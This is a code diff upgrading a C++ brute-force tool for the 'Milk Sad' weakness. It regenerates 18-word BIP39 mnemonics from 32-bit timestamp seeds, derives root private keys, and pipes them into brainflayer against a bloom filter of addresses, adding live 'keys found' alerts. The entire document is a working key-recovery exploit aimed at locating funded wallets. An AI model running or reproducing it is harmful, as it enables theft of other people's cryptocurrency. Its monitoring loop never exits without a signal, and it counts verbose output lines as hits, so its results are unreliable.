@@ -1,5 +1,5 @@
 /**
- * Milk Sad Vulnerability Reproducer (Upgraded - 18 Words Variant)
+ * Milk Sad Vulnerability Reproducer (Upgraded - 18 Words Variant + Live Found Monitor)
  * Generates BIP39 Mnemonics (192-bit / 18 Words) based on 32-bit Time Seed
  * checks against brainflayer via pipe.
  */
@@ -34,12 +34,13 @@
 
 // --- Configuration ---
 const std::string WORDLIST_DIR = "./Wordlist/";
-const std::string OUTPUT_FILE_PREFIX = "found_keys_";
-const uint64_t REPORT_INTERVAL = 100000; // Report to stdout every N keys per thread
-const int DEFAULT_NUM_THREADS = 10; // Default safe number
+const std::string OUTPUT_FILE_PREFIX = "brainflayer_found_";
+const uint64_t REPORT_INTERVAL = 50000; // Report & Check file every N keys per thread
+const int DEFAULT_NUM_THREADS = 4; 
 
-// --- Global Flags ---
+// --- Global Flags & Counters ---
 std::atomic<bool> g_stop_flag(false);
+std::atomic<uint64_t> g_total_found_keys(0); // [UPGRADE] Global counter for found keys
 
 // --- Signal Handler ---
 void signal_handler(int) {
@@ -52,6 +53,16 @@ void signal_handler(int) {
 bool file_exists(const std::string& filename) {
     struct stat buffer;
     return (stat(filename.c_str(), &buffer) == 0);
+}
+
+// [UPGRADE] Function to count lines in a file to detect hits
+size_t count_lines_in_file(const std::string& filename) {
+    std::ifstream file(filename);
+    if (!file.is_open()) return 0;
+    
+    // Fast way to count newlines
+    return std::count(std::istreambuf_iterator<char>(file), 
+                      std::istreambuf_iterator<char>(), '\n');
 }
 
 std::vector<std::string> load_wordlist(const std::string& filename) {
@@ -97,46 +108,37 @@ std::vector<uint8_t> sha256(const std::vector<uint8_t>& data) {
 
 // Generate BIP39 Mnemonic from a 32-bit Time Seed (Modified for 18 Words / 192-bit)
 std::string generate_mnemonic_bip39(uint32_t seed_value, const std::vector<std::string>& wordlist) {
-    // 1. Initialize Mersenne Twister with the timestamp
     std::mt19937 engine(seed_value);
 
-    // 2. Generate 192 bits (24 bytes) of entropy
-    // MODIFIED: Changed from 32 bytes (256 bits) to 24 bytes (192 bits)
+    // 192 bits (24 bytes) of entropy for 18 words
     const int ENTROPY_BYTES = 24; 
     std::vector<uint8_t> entropy(ENTROPY_BYTES);
     
     for (size_t i = 0; i < ENTROPY_BYTES; i += 4) {
         uint32_t random_block = engine();
-        // Copy 4 bytes safely
         std::memcpy(&entropy[i], &random_block, 4);
     }
 
-    // 3. Calculate Checksum 
-    // For 192 bits entropy, checksum is 192 / 32 = 6 bits.
-    // SHA256(entropy), take first byte (we will only use top 6 bits)
+    // Checksum: 192 / 32 = 6 bits
     std::vector<uint8_t> hash = sha256(entropy);
     uint8_t checksum_byte = hash[0];
 
-    // 4. Combine Entropy + Checksum 
-    // Total needed: 18 words * 11 bits = 198 bits.
-    // Entropy (192 bits) + Checksum (6 bits) = 198 bits.
+    // Combine Entropy + Checksum
     std::vector<uint8_t> combined = entropy;
     combined.push_back(checksum_byte); 
 
     std::string mnemonic;
     mnemonic.reserve(200); 
 
-    // Loop for 18 words (MODIFIED from 24)
     const int NUM_WORDS = 18;
     for (int i = 0; i < NUM_WORDS; ++i) {
         int start_bit = i * 11;
         int word_index = 0;
 
-        // Extract 11 bits starting from start_bit
         for (int bit = 0; bit < 11; ++bit) {
             int total_bit_pos = start_bit + bit;
             int byte_pos = total_bit_pos / 8;
-            int bit_pos_in_byte = 7 - (total_bit_pos % 8); // Big Endian reading
+            int bit_pos_in_byte = 7 - (total_bit_pos % 8); 
 
             if ((combined[byte_pos] >> bit_pos_in_byte) & 1) {
                 word_index |= (1 << (10 - bit));
@@ -150,11 +152,10 @@ std::string generate_mnemonic_bip39(uint32_t seed_value, const std::vector<std::
     return mnemonic;
 }
 
-// Convert Mnemonic to Root Private Key (BIP39 Seed -> BIP32 Master Key)
+// Convert Mnemonic to Root Private Key
 std::string mnemonic_to_root_key_hex(const std::string& mnemonic) {
-    // 1. PBKDF2: Mnemonic + Salt("mnemonic") -> 512-bit Seed
     const int iterations = 2048;
-    const std::string salt = "mnemonic"; // No passphrase used in this reproduction
+    const std::string salt = "mnemonic"; 
     std::vector<uint8_t> seed(64);
     
     if (PKCS5_PBKDF2_HMAC(mnemonic.c_str(), mnemonic.length(),
@@ -163,8 +164,6 @@ std::string mnemonic_to_root_key_hex(const std::string& mnemonic) {
         return "";
     }
 
-    // 2. HMAC-SHA512: Key("Bitcoin seed") + Data(Seed) -> Master Node (Private Key + Chain Code)
-    // We only need the first 32 bytes (Private Key) for brainflayer checking
     const std::string hmac_key = "Bitcoin seed";
     unsigned char hmac_result[64];
     unsigned int hmac_len;
@@ -174,7 +173,6 @@ std::string mnemonic_to_root_key_hex(const std::string& mnemonic) {
          seed.data(), seed.size(), 
          hmac_result, &hmac_len);
 
-    // Convert first 32 bytes to Hex
     std::stringstream ss;
     ss << std::hex << std::setfill('0');
     for (int i = 0; i < 32; ++i) {
@@ -187,7 +185,6 @@ std::string mnemonic_to_root_key_hex(const std::string& mnemonic) {
 
 uint32_t get_unix_timestamp(const std::tm& tm) {
     std::tm temp_tm = tm;
-    // Set environment to UTC to ensure mktime treats input as UTC
     #ifdef _WIN32
         _putenv("TZ=UTC");
         _tzset();
@@ -217,11 +214,11 @@ void worker_thread(uint32_t start_ts, uint32_t end_ts, int thread_id,
                    std::atomic<uint64_t>& global_counter,
                    std::mutex& print_mtx) {
     
+    // Output filename specific to this thread
+    std::string output_filename = OUTPUT_FILE_PREFIX + std::to_string(thread_id) + ".txt";
+    
     // Command to pipe into brainflayer
-    // -i - : read from stdin
-    // -t priv : input is hex private keys
-    // -x : output format hex
-    std::string cmd = "./brainflayer/brainflayer -v -b ./040823BF.blf -t priv -x > brainflayer_found_" + std::to_string(thread_id) + ".txt 2>&1";
+    std::string cmd = "./brainflayer/brainflayer -v -b ./040823BF.blf -t priv -x > " + output_filename + " 2>&1";
     
     FILE* pipe = popen(cmd.c_str(), "w");
     if (!pipe) {
@@ -231,6 +228,7 @@ void worker_thread(uint32_t start_ts, uint32_t end_ts, int thread_id,
     }
 
     uint64_t local_processed = 0;
+    size_t last_known_found_count = 0; // [UPGRADE] Track local file lines
     
     for (uint32_t ts = start_ts; ts <= end_ts && !g_stop_flag; ++ts) {
         // Core Logic
@@ -239,18 +237,31 @@ void worker_thread(uint32_t start_ts, uint32_t end_ts, int thread_id,
         
         // Write to brainflayer
         if (fprintf(pipe, "%s\n", priv_hex.c_str()) < 0) {
-             // Pipe broken
-             break;
+             break; // Pipe broken
         }
 
         local_processed++;
         global_counter.fetch_add(1, std::memory_order_relaxed);
 
-        // Progress logging
+        // Progress logging & Hit Checking
         if (local_processed % REPORT_INTERVAL == 0) {
+            // [UPGRADE] Check if the output file has grown (meaning brainflayer found something)
+            size_t current_lines = count_lines_in_file(output_filename);
+            
             std::lock_guard<std::mutex> lock(print_mtx);
-            std::cout << "[Thread " << thread_id << "] Current TS: " << ts 
-                      << " | Processed: " << local_processed << std::endl;
+            
+            // Check for NEW hits
+            if (current_lines > last_known_found_count) {
+                size_t new_hits = current_lines - last_known_found_count;
+                g_total_found_keys += new_hits;
+                std::cout << "\n\033[1;32m[!!!] THREAD " << thread_id << " FOUND " << new_hits << " KEYS! Check " << output_filename << "\033[0m" << std::endl;
+                last_known_found_count = current_lines;
+            }
+
+            std::cout << "[Thread " << thread_id << "] TS: " << ts 
+                      << " | Processed: " << local_processed 
+                      << " | Found (Local): " << last_known_found_count 
+                      << std::endl;
         }
     }
 
@@ -258,25 +269,30 @@ void worker_thread(uint32_t start_ts, uint32_t end_ts, int thread_id,
     
     {
         std::lock_guard<std::mutex> lock(print_mtx);
-        std::cout << "[Thread " << thread_id << "] Finished. Total processed: " << local_processed << std::endl;
+        // Final check
+        size_t final_lines = count_lines_in_file(output_filename);
+        if (final_lines > last_known_found_count) {
+             g_total_found_keys += (final_lines - last_known_found_count);
+        }
+        std::cout << "[Thread " << thread_id << "] Finished. Total processed: " << local_processed 
+                  << " | Total Found: " << final_lines << std::endl;
     }
 }
 
 // --- Main Menu & Logic ---
 
 int main() {
-    // 1. Prevent crash on broken pipe (if brainflayer closes early)
     signal(SIGPIPE, SIG_IGN);
     signal(SIGINT, signal_handler);
     signal(SIGTERM, signal_handler);
 
     OpenSSL_add_all_algorithms();
 
-    std::cout << "=================================================" << std::endl;
-    std::cout << "   Milk Sad Vulnerability Reproducer (18 Words)  " << std::endl;
-    std::cout << "=================================================" << std::endl;
+    std::cout << "======================================================" << std::endl;
+    std::cout << " Milk Sad Vulnerability Reproducer (18 Words + Stats) " << std::endl;
+    std::cout << "======================================================" << std::endl;
 
-    // 2. Check Prerequisites
+    // Prerequisites check
     if (!file_exists("./brainflayer/brainflayer")) {
         std::cerr << "Error: ./brainflayer/brainflayer executable not found!" << std::endl;
         return 1;
@@ -286,18 +302,16 @@ int main() {
         return 1;
     }
 
-    // 3. Load Wordlist
+    // Load Wordlist
     std::vector<std::string> wordlist;
     try {
         std::cout << "[*] Loading english.txt..." << std::endl;
         wordlist = load_wordlist("english.txt");
     } catch (const std::exception& e) {
         std::cerr << "Error: " << e.what() << std::endl;
-        std::cerr << "Make sure 'english.txt' is in ./Wordlist/ or current directory." << std::endl;
         return 1;
     }
 
-    // 4. User Input
     int choice;
     std::cout << "\nSelect Mode:\n";
     std::cout << "1. Single Timestamp Check\n";
@@ -309,6 +323,7 @@ int main() {
     uint32_t start_ts = 0, end_ts = 0;
 
     if (choice == 1) {
+        // [UPGRADE] Enhanced single check feedback
         std::string date_str, time_str;
         std::cout << "Enter Date (YYYY-MM-DD): ";
         std::cin >> date_str;
@@ -323,12 +338,17 @@ int main() {
         
         std::string m = generate_mnemonic_bip39(ts, wordlist);
         std::string k = mnemonic_to_root_key_hex(m);
-        std::cout << "Mnemonic (18 words): " << m << std::endl;
+        std::cout << "Mnemonic: " << m << std::endl;
         std::cout << "Root Key: " << k << std::endl;
+        std::cout << "Checking against bloom filter..." << std::endl;
         
-        // Single check cmd
+        // Use system to pipe directly to stdout for single check
         std::string cmd = "echo " + k + " | ./brainflayer/brainflayer -v -b ./040823BF.blf -t priv -x";
-        system(cmd.c_str());
+        int ret = system(cmd.c_str());
+        
+        if (ret == 0) {
+             std::cout << "\n[Note] If you see a key above, it was FOUND." << std::endl;
+        }
         return 0;
 
     } else if (choice == 2) {
@@ -340,10 +360,7 @@ int main() {
 
         std::tm tm_start = parse_iso_date(start_str);
         std::tm tm_end = parse_iso_date(end_str);
-        
-        // Set start to 00:00:00
         tm_start.tm_hour = 0; tm_start.tm_min = 0; tm_start.tm_sec = 0;
-        // Set end to 23:59:59
         tm_end.tm_hour = 23; tm_end.tm_min = 59; tm_end.tm_sec = 59;
 
         start_ts = get_unix_timestamp(tm_start);
@@ -360,14 +377,18 @@ int main() {
     int num_threads = DEFAULT_NUM_THREADS;
     std::cout << "Enter number of threads (Default " << DEFAULT_NUM_THREADS << "): ";
     if (std::cin.peek() != '\n') std::cin >> num_threads;
-    
     if (num_threads < 1) num_threads = 1;
+
+    // Clear old result files (Optional, for safety)
+    for(int i=0; i<num_threads; i++) {
+        std::string fname = OUTPUT_FILE_PREFIX + std::to_string(i) + ".txt";
+        remove(fname.c_str());
+    }
 
     std::cout << "\n[*] Starting Scan..." << std::endl;
     std::cout << "Range: " << start_ts << " to " << end_ts << std::endl;
-    std::cout << "Total keys: " << (uint64_t)end_ts - start_ts << std::endl;
+    std::cout << "Total keys to generate: " << (uint64_t)end_ts - start_ts << std::endl;
 
-    // 5. Thread Distribution
     std::vector<std::thread> threads;
     std::atomic<uint64_t> total_counter(0);
     std::mutex print_mutex;
@@ -385,13 +406,32 @@ int main() {
                              std::ref(print_mutex));
     }
 
-    // Wait for threads
+    // Main thread monitoring loop (optional additional stats)
+    while(!g_stop_flag) {
+        std::this_thread::sleep_for(std::chrono::seconds(2));
+        bool all_done = true;
+        // Simple check if threads are still running would require more logic,
+        // so we just rely on join() below. 
+        // We can just print a summary line here if needed.
+    }
+
     for (auto& t : threads) {
         if (t.joinable()) t.join();
     }
 
-    std::cout << "\n[!] Scan Complete." << std::endl;
-    std::cout << "Check 'brainflayer_found_*.txt' files for any hits." << std::endl;
+    std::cout << "\n======================================================" << std::endl;
+    std::cout << " [!] Scan Complete." << std::endl;
+    std::cout << " Total Keys Processed: " << total_counter.load() << std::endl;
+    
+    // [UPGRADE] Final Result Summary
+    uint64_t final_found = g_total_found_keys.load();
+    if (final_found > 0) {
+        std::cout << "\033[1;32m [SUCCESS] TOTAL KEYS FOUND: " << final_found << " \033[0m" << std::endl;
+        std::cout << " Check files named '" << OUTPUT_FILE_PREFIX << "*.txt'" << std::endl;
+    } else {
+        std::cout << " [RESULT] No keys found in this range." << std::endl;
+    }
+    std::cout << "======================================================" << std::endl;
 
     return 0;
 }
